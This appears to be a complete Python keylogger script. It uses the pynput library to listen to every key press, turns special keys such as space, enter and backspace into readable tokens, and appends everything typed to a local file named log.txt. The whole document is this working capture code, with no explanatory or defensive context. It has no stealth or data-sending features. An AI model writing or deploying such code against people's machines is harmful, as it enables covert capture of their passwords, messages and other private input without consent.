from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift' or letter == 'Key.shift_r' or letter == 'Key.shift<192>' or letter == 'Key.alt_l' or letter == 'Key.alt_r' or letter == 'Key.cmd' or letter == 'Key.cmdv' or letter == 'Key.alt_gr' or letter == 'Key.end' or letter == '':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        letter = "[BACKSPACE]"
    if letter == "Key.tab":
        letter = "[TAB]"
    if letter == "Key.caps_lock":
        letter = '[CAPS_LOCK]'
    if letter == "Key.right":
        letter = ">"
    if letter == "Key.left":
        letter = "<"
    if letter == "Key.up":
        letter = "[UP]"
    if letter == "Key.down":
        letter = "[DOWN]"

    with open("log.txt", 'a') as log:
        log.write(letter)



with Listener(on_press=write_to_file) as l:
    l.join()

